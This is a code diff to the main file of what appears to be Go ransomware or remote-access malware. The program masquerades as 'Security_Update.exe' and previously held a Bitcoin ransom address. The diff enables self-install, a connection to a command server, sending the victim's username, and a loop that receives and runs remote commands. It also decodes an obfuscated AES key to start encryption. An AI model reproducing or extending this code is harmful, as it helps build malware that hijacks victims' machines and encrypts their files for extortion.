@@ -5,28 +5,33 @@
 
 package main
 
-import "os/user"
 import (
 	"crypto/rand"
 	"fmt"
 	"strings"
-	"time"
+
+	"./aes"
+	"./base64"
+	"./install"
+	"./instances"
+	"./network"
+	"./utils"
 )
 
-const TARGET_FILE_NAME = "Security_Update.exe" // check name Wscript.exe
-const BTC_ADDRESS string = "1BwwT5zo5FwQdWniUSay2AUrPrbYph9SxP"
+// TargetFileName is the name taken by the Program
+const TargetFileName = "Security_Update.exe" // check name Wscript.exe
 
 var key_text []byte
 
 func main() {
 	//Check if already running
-	//CheckMultiInstances()
-	//Install()
+	instances.CheckMultiInstances()
+	install.Install()
 	//go Spread()
-	//c, _ = Connect()
-	//Send("user", GetUsername())
-	//go ListenAndExecute()
-	//go Reconnect()
+	network.Connect()
+	network.Send("user", utils.GetUsername())
+	go ListenAndExecute()
+	go network.Reconnect()
 
 	//SendData("Ok from client using cap'p")
 
@@ -43,12 +48,12 @@ func main() {
 
 	//Gen aes key
 	b := make([]byte, 36)
-	key, err := rand.Read(b)
+	_, err := rand.Read(b)
 	if err != nil {
 		fmt.Println("error:", err)
 		return
 	}
-	fmt.Println(key)
+	fmt.Println(b)
 
 	//Gen
 	//Deofuscate key
@@ -57,22 +62,17 @@ func main() {
 	b64_3 := "ipMZy5" + "VYm13O"
 	b64_4 := "Xg+WF" + "9jKnE="
 	final := b64_1 + b64_2 + b64_3 + b64_4
-	key_text = []byte(Base64Decode(final))
+	key_text = []byte(base64.Base64Decode(final))
 	//When key decoded
-	InitializeBlock()
+	aes.InitializeBlock(key_text, TargetFileName)
 	for {
 	}
-}
-func GetUsername() string {
-	usr, _ := user.Current()
-	return usr.Username
 }
 
 // ListenAndExecute recives commands and executes them
 func ListenAndExecute() {
 	for {
-		status := Receive()
-		fmt.Println(status)
+		status := network.Receive()
 		go ParseProtocol(status)
 	}
 
@@ -88,14 +88,8 @@ func ParseProtocol(r string) {
 		if len(commandBuff) >= 3 {
 			args = commandBuff[2]
 		}
-		fmt.Println(cmd, target, args)
 		//Concurrently executes command
-		Execute(cmd, target, args)
+		network.Execute(cmd, target, args)
 
 	}
-}
-
-// Wait waits 30 seconds
-func Wait(s time.Duration) {
-	time.Sleep(s * time.Second)
 }
